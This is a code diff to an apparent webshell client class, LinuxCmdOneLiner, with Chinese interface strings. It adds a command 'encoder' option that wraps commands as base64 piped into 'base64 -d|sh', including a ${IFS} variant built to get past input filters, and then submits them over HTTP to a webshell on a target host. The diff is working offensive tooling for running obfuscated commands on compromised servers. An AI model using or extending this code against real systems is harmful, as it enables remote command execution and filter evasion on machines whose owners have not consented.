@@ -147,6 +147,18 @@ class LinuxCmdOneLiner:
             "name": "高级连接配置",
             "options": [
                 ConnOption(
+                    id="encoder",
+                    name="命令编码器",
+                    type="select",
+                    placeholder="raw",
+                    default_value="raw",
+                    alternatives=[
+                        {"name": "raw", "value": "raw"},
+                        {"name": "base64_quote", "value": "base64_quote"},
+                        {"name": "base64_ifs", "value": "base64_ifs"},
+                    ],
+                ),
+                ConnOption(
                     id="decoder",
                     name="解码器",
                     type="select",
@@ -156,14 +168,6 @@ class LinuxCmdOneLiner:
                         {"name": "raw", "value": "raw"},
                         {"name": "base64", "value": "base64"},
                     ],
-                ),
-                ConnOption(
-                    id="wrap_shell",
-                    name="使用sh -c执行",
-                    type="checkbox",
-                    placeholder=None,
-                    default_value=False,
-                    alternatives=None,
                 ),
                 ConnOption(
                     id="https_verify",
@@ -231,7 +235,7 @@ class LinuxCmdOneLiner:
         )
 
         self.decoder = session_conn.get("decoder", "raw")
-        self.wrap_shell = session_conn.get("wrap_shell", False)
+        self.encoder = session_conn.get("encoder", "raw")
 
         self.client = get_http_client(verify=self.https_verify)
 
@@ -485,14 +489,21 @@ class LinuxCmdOneLiner:
             stop=stop,
             decoder={"raw": "", "base64": "|base64 -w0"}.get(self.decoder, "")
         )
-        if self.wrap_shell:
+        if self.encoder == "base64_quote":
+            code = shell_command(["sh", "-c", "echo " + base64.b64encode(code.encode()).decode() + "|base64 -d|sh"])
+        elif self.encoder == "base64_ifs":
             code = "sh -c echo${IFS}" + base64.b64encode(code.encode()).decode() + "|base64${IFS}-d|sh"
+        elif self.encoder == "raw":
+            pass
+        else:
+            raise exceptions.UserError("未知encoder: " + self.encoder)
         status_code, html = await self.submit_http(code)
         if status_code == 404:
             raise exceptions.TargetUnreachable(
                 f"状态码404, 没有这个webshell: {status_code}"
             )
         if (start1 + start2) not in html:
+            print(f"{html=}")
             raise exceptions.PayloadOutputError(
                 "找不到输出文本的开头，也许webshell没有执行代码？"
             )
